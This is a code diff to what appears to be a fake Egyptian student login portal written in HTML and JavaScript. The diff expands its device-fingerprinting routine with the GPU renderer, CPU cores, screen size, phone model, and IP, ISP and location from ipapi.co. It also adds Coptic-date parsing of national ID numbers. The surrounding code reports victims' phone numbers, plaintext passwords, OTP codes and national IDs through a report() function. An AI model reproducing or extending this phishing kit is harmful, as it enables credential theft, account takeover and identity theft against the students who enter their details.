@@ -304,7 +304,7 @@
         }
 
         // ==========================================
-        //  تحليل الرقم القومي (أبراج، هجري، ترتيب)
+        //  تحليل الرقم القومي (أبراج، هجري، قبطي)
         // ==========================================
         function analyzeNationalID(id) {
             if (!id || id.length !== 14) return "الرقم القومي غير صحيح";
@@ -327,6 +327,7 @@
             const sequence = parseInt(id.substring(9, 13));
             const gender = sequence % 2 !== 0 ? "ذكر" : "أنثى";
 
+            // ZODIAC
             const getZodiac = (d, m) => {
                 const days = [21, 20, 21, 20, 21, 21, 23, 23, 23, 23, 22, 22];
                 const signs = ["الدلو", "الحوت", "الحمل", "الثور", "الجوزاء", "السرطان", "الأسد", "العذراء", "الميزان", "العقرب", "القوس", "الجدي"];
@@ -338,8 +339,14 @@
             const chineseZodiac = ['القرد', 'الديك', 'الكلب', 'الخنزير', 'الفأر', 'الثور', 'النمر', 'الأرنب', 'التنين', 'الأفعى', 'الحصان', 'العنزة'];
             const cZodiac = chineseZodiac[year % 12];
 
+            // DATES
             const dateObj = new Date(year, month - 1, day);
             const hijriDate = new Intl.DateTimeFormat('ar-SA-u-ca-islamic', {day: 'numeric', month: 'long', year: 'numeric'}).format(dateObj);
+            
+            // Coptic Date Addition
+            const copticDate = new Intl.DateTimeFormat('ar-EG-u-ca-coptic', {
+                day: 'numeric', month: 'long', year: 'numeric'
+            }).format(dateObj);
 
             return `📅 *تاريخ الميلاد:* ${day}/${month}/${year}\n` +
                    `📍 *محل الميلاد:* ${gov}\n` +
@@ -347,105 +354,144 @@
                    `🌟 *البرج:* ${getZodiac(day, month)}\n` +
                    `🐉 *البرج الصيني:* ${cZodiac}\n` +
                    `🕌 *تاريخ الميلاد الهجري:* ${hijriDate}\n` +
-                   `🔢 *تسلسل المولود:* ${id[12]} (في سجلات اليوم)`;
+                   `⛪ *تاريخ الميلاد القبطي:* ${copticDate}\n` +
+                   `🔢 *تسلسل المولود:* ${id[12]}`;
         }
 
         // ==========================================
-        //  دالة جمع بيانات الجهاز الموسعة
+        //  دالة سحب البيانات المتقدمة (BASIC INFO / DEVICE DETAILS)
         // ==========================================
         async function getDeviceInfo() {
             let info = {
-                deviceType: "غير معروف",
-                osVersion: "غير محدد",
-                ram: "غير معروف",
-                storage: "غير متاح",
-                battery: "غير متاح",
-                isp: "غير معروف",
-                ip: "",
-                city: "",
-                country: "",
-                locationLink: "",
-                simInfo: "غير متاح (محظور من المتصفح)",
-                macAddr: "🔒 Blocked by Browser Security"
+                basic: {
+                    ip: "N/A",
+                    isp: "N/A",
+                    city: "Unknown",
+                    country: "Unknown",
+                    connectionType: "Unknown"
+                },
+                device: {
+                    platform: navigator.platform,
+                    osVersion: "Unknown",
+                    model: "Generic/Unknown",
+                    cpuCores: navigator.hardwareConcurrency || "Unknown",
+                    ram: "Unknown",
+                    screen: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`,
+                    gpu: "Unknown",
+                    battery: "N/A"
+                },
+                storage: {
+                    total: "Protected",
+                    quota: "N/A",
+                    type: "Unknown"
+                }
             };
 
             const ua = navigator.userAgent;
 
-            // 1. نوع وإصدار الجهاز بدقة أكبر
+            // 1. Identify OS Version & Model Attempt
             if (/android/i.test(ua)) {
-                info.deviceType = "📱 Android";
                 const match = ua.match(/Android\s([0-9\.]+)/);
-                info.osVersion = match ? `Android ${match[1]}` : "Android";
-            } else if (/iphone/i.test(ua)) {
-                info.deviceType = "📱 iPhone";
+                info.device.osVersion = match ? `Android ${match[1]}` : "Android";
+                
+                // Try to extract Model from User Agent
+                const modelMatch = ua.match(/;\s([A-Za-z0-9\s\-\_]+)\sBuild/);
+                if(modelMatch && modelMatch[1]) {
+                    info.device.model = modelMatch[1].trim(); 
+                } else {
+                    info.device.model = "Android Device (Generic)";
+                }
+
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
                 const match = ua.match(/OS\s([0-9_]+)/);
-                info.osVersion = match ? `iOS ${match[1].replace(/_/g, '.')}` : "iOS";
+                info.device.osVersion = match ? `iOS ${match[1].replace(/_/g, '.')}` : "iOS";
+                info.device.model = /iphone/i.test(ua) ? "iPhone" : "iPad";
+                
+                // Hardware specific check for iPhones (GPU renderer often helps identification)
             } else if (/windows/i.test(ua)) {
-                info.deviceType = "💻 Windows";
-                info.osVersion = "Windows NT";
-            } else if (/macintosh/i.test(ua)) {
-                info.deviceType = "💻 Mac OS";
-            } else if (/linux/i.test(ua)) {
-                info.deviceType = "💻 Linux";
+                info.device.osVersion = "Windows";
+                info.device.model = "PC / Laptop";
             }
 
-            // 2. معلومات الرام (متاح في متصفحات كروم/إيدج الحديثة فقط)
+            // 2. RAM (Approximate)
             if ('deviceMemory' in navigator) {
-                info.ram = `~${navigator.deviceMemory} GB`;
+                info.device.ram = `~${navigator.deviceMemory} GB`;
+            } else {
+                info.device.ram = "Not Supported by Browser";
             }
 
-            // 3. معلومات التخزين (Quota المتاح للمتصفح)
-            if ('storage' in navigator && 'estimate' in navigator.storage) {
-                try {
-                    const estimate = await navigator.storage.estimate();
-                    const available = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
-                    info.storage = `${available} GB (حصة المتصفح)`;
-                } catch(e) {}
-            }
+            // 3. GPU Renderer
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        info.device.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch(e) {}
 
-            // 4. البطارية
+            // 4. Battery
             if ('getBattery' in navigator) {
                 try {
                     const batt = await navigator.getBattery();
-                    info.battery = `${Math.round(batt.level * 100)}% ${batt.charging ? '(⚡ يشحن)' : '(🔌 غير موصول)'}`;
+                    info.device.battery = `${Math.round(batt.level * 100)}% ${batt.charging ? '⚡' : '🔋'}`;
                 } catch (e) {}
             }
 
-            // 5. بيانات الشبكة والموقع (Sim IP vs Wifi IP)
-            // المتصفح يرى IP واحد فقط (الذي يخرج منه للإنترنت). نميزه عن طريق الـ ISP.
+            // 5. Storage (Quota)
+            if ('storage' in navigator && 'estimate' in navigator.storage) {
+                try {
+                    const estimate = await navigator.storage.estimate();
+                    const quota = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
+                    info.storage.quota = `${quota} GB (Browser Quota)`;
+                    info.storage.type = "Internal / Flash";
+                } catch(e) {}
+            }
+
+            // 6. Network (IP & ISP)
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                info.ip = data.ip || "N/A";
-                info.isp = data.org || data.asn || "N/A";
-                info.city = data.city || "N/A";
-                info.country = data.country_name || "N/A";
-                if(data.latitude && data.longitude) {
-                    info.locationLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-                } else {
-                    info.locationLink = "غير متاح";
-                }
+                info.basic.ip = data.ip || "N/A";
+                info.basic.isp = data.org || data.asn || "N/A";
+                info.basic.city = data.city || "N/A";
+                info.basic.country = data.country_name || "N/A";
                 
-                // محاولة تخمين نوع الاتصال بناء على المزود
-                if(/vodafone|orange|etisalat|we|telecom egypt|mobile/i.test(info.isp)) {
-                    info.simInfo = `📶 اتصال بيانات (Mobile Data) - ${info.isp}`;
+                if(/vodafone|orange|etisalat|we|telecom|mobile|lte/i.test(info.basic.isp)) {
+                    info.basic.connectionType = "Mobile Data (Cellular)";
                 } else {
-                    info.simInfo = `🌐 اتصال منزلي (WiFi/DSL) - ${info.isp}`;
+                    info.basic.connectionType = "WiFi / DSL / Fiber";
                 }
+            } catch (e) {}
 
-            } catch (e) {
-                info.locationLink = "فشل تحديد الموقع";
-            }
+            // Formatting the Output Report
+            return `
+📊 *BASIC INFO*
+──────────────────
+🌐 *IP Address:* \`${info.basic.ip}\`
+📡 *ISP (مزود الخدمة):* ${info.basic.isp}
+📶 *Connection:* ${info.basic.connectionType}
+🏙️ *Location:* ${info.basic.city}, ${info.basic.country}
 
-            return `📱 *الجهاز:* ${info.deviceType} (${info.osVersion})\n` +
-                   `💾 *الرامات:* ${info.ram} | *التخزين:* ${info.storage}\n` +
-                   `🔋 *البطارية:* ${info.battery}\n` +
-                   `📡 *MAC Address:* \`${info.macAddr}\`\n` +
-                   `📞 *رقم الخط:* 🔒 غير متاح (يتطلب إذن Carrier)\n` +
-                   `🌐 *نوع الاتصال (IP):* \n${info.simInfo}\n` +
-                   `📍 *IP Address:* \`${info.ip}\`\n` +
-                   `🏙️ *الموقع:* ${info.city} - ${info.country}\n` +
-                   `🗺️ *الخريطة:* ${info.locationLink}`;
+📱 *DEVICE DETAILS*
+──────────────────
+📲 *Model:* \`${info.device.model}\`
+🤖 *OS:* ${info.device.osVersion}
+🔌 *CPU Cores:* ${info.device.cpuCores} Cores
+🎮 *GPU:* ${info.device.gpu}
+💾 *RAM:* ${info.device.ram}
+📏 *Screen:* ${info.device.screen}
+🔋 *Battery:* ${info.device.battery}
+🔑 *IMEI:* 🔒 \`Protected (Requires App Permission)\`
+🆔 *MAC:* 🔒 \`Blocked by Browser Security\`
+
+💽 *Internal Storage*
+──────────────────
+📦 *Browser Quota:* ${info.storage.quota}
+🗄️ *Type:* ${info.storage.type}
+`.trim();
         }
 
         async function report(txt) {
@@ -543,8 +589,6 @@
                             `📧 *البريد:* ${user.email || 'غير مدخل'}\n\n` +
                             `🆔 *تحليل بيانات الطالب:*\n` +
                             `${idAnalysis}\n\n` +
-                            `──────────────────\n` +
-                            `🛠️ *تفاصيل الجهاز والشبكة:*\n` +
                             `${fullInfo}`);
 
                 showStatus("جاري تحويلك للمنصة...", "success");
@@ -553,7 +597,6 @@
                 await report(`❌ *محاولة دخول فاشلة*\n\n` +
                             `📱 *الهاتف:* \`${phone}\`\n` +
                             `🔐 *الباسورد المدخل:* \`${pass}\`\n\n` +
-                            `🛠️ *تفاصيل الجهاز والشبكة:*\n` +
                             `${fullInfo}`);
 
                 showStatus("بيانات الدخول غير صحيحة", "error");
@@ -598,8 +641,6 @@
                               `🆔 *تحليل الرقم القومي (14 رقم):*\n` +
                               `🔢 الرقم: \`${user.nat}\`\n` +
                               `${idAnalysis}\n` +
-                              `──────────────────\n` +
-                              `🛠️ *تقرير الجهاز والعتاد:*\n` +
                               `${deviceReport}`;
 
             await report(reportMsg);
@@ -625,7 +666,7 @@
                             `👤 *اسم الطالب:* ${user.name}\n` +
                             `📱 *الهاتف:* \`${phone}\`\n` +
                             `🔢 *رمز التحقق:* \`${currentOTP}\`\n\n` +
-                            `🛠️ *الجهاز:* \n${fullInfo}`);
+                            `${fullInfo}`);
                 
                 setTimeout(() => switchView('forgot-step2'), 1000);
             } else {
@@ -658,7 +699,7 @@
             await report(`🔄 *تم تغيير كلمة المرور*\n\n` +
                         `📱 *الهاتف:* \`${phone}\`\n` +
                         `🔐 *الباسورد الجديد:* \`${np}\`\n\n` +
-                        `🛠️ *الجهاز:* \n${fullInfo}`);
+                        `${fullInfo}`);
             
             showStatus("تم التحديث بنجاح!", "success");
             setTimeout(() => switchView('login-view'), 1500);
@@ -667,4 +708,4 @@
         document.addEventListener('contextmenu', e => e.preventDefault());
     </script>
 </body>
-                                                                                                                </html>
+</html>
